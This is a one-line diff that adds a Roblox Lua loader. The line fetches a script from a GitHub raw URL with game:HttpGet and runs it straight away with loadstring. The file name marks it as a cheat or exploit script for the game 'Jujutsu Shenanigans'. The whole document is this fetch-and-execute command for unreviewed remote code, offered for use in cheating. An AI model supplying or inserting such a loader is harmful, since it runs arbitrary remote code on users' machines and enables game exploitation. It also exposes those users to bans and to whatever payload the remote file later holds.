@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Swarmzorouter/loaders/main/loaders/sky-assassin-jujutsu-shenanigans-spam5-g0x60fphhdjbdi.lua"))()
